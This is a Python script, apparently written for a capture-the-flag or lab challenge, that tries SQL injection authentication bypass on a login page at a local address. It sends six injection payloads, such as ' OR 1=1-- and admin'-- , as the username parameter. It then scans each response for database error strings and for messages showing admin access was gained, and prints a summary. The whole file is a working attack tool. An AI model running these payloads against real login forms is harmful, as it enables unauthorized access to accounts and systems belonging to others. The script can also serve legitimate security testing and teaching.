import requests
import urllib.parse
import re

target_url = "http://127.0.0.1:33148/index.php"

test_payloads = {
    "admin%23": "admin%23",
    "admin'-- ": "admin%27--+",
    "admin' OR '1'='1": "admin%27+OR+%271%27%3D%271",
    "admin' AND 1=1-- ": "admin%27+AND+1%3D1--+",
    "admin\\' OR 1=1-- ": "admin%5C%27+OR+1%3D1--+",
    "' OR 1=1-- ": "%27+OR+1%3D1--+",
}

print("[*] Authentication bypass test sequence")
print(f"[*] Target: {target_url}\n")

results = {}

for name, payload in test_payloads.items():
    print(f"[TEST] {name}")
    print(f"[TEST] Encoded: {payload}\n")
    
    try:
        response = requests.get(
            target_url,
            params={"username": urllib.parse.unquote(payload)},
            timeout=10,
            allow_redirects=True
        )
        
        results[name] = {
            "status_code": response.status_code,
            "content_length": len(response.content),
            "response_body": response.text,
        }
        
        print(f"Status: {response.status_code}")
        print(f"Length: {len(response.content)} bytes")
        
        body_lower = response.text.lower()
        
        sql_errors = [
            "sql syntax", "mysql", "sqlite", "php error",
            "sql error", "syntax error", "database error"
        ]
        
        found_errors = []
        for error_phrase in sql_errors:
            if error_phrase in body_lower:
                found_errors.append(error_phrase)
        
        not_admin = "you are not the admin" in body_lower
        success = "you are the admin" in body_lower or "welcome admin" in body_lower
        
        print(f"Not Admin Message: {not_admin}")
        
        if found_errors:
            print(f"[!] SQL ERRORS: {found_errors}")
        
        if success:
            print(f"[!] SUCCESS INDICATOR: Admin access detected")
        
        if not_admin == False and found_errors == []:
            print(f"[!] PAYLOAD BEHAVIOR CHANGE: Original message missing")
        
        preview = response.text[:400] if len(response.text) > 400 else response.text
        print(f"\nResponse Preview:\n{preview}")
        if len(response.text) > 400:
            print(f"... ({len(response.text) - 400} more characters)")
        
    except requests.exceptions.RequestException as e:
        print(f"[!] ERROR: {e}")
        results[name] = {"error": str(e)}
    
    print("\n" + "=" * 80 + "\n")

print("\n[*] SUMMARY")
print("-" * 80)

for name, result in results.items():
    print(f"\nPayload: {name}")
    if "error" in result:
        print(f"  FAILED: {result['error']}")
    else:
        print(f"  Status: {result['status_code']}")
        print(f"  Length: {result['content_length']} bytes")
        
        body_lower = result['response_body'].lower()
        not_admin = "you are not the admin" in body_lower
        print(f"  Not Admin Message: {not_admin}")

print("\n[*] Testing complete")
